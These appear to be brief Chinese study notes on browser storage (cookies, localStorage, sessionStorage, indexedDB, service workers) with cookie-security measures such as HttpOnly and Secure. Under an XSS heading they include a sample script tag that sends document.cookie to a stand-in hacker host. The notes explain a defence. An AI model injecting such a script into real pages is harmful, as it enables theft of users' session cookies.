// 在浏览器里，如何缓存数据
// - cookie    4KB 每次都会带上 影响http性能
// 重要考点 XSS 跨站脚本攻击
<script>
    fetch('http://heike.com?cookie=+document.cookie')
<script/> 
http only

    - 更安全？
        https 
        Secure 安全 非HTTPS链接发送cookie
        签名 
         

// - localStorage/sessionStorage 5MB 关掉窗口后就会消失
// - indexedDB 前端数据库 更大 支持复杂操作 事务
// - service worker 离线存储 不联网也能打开
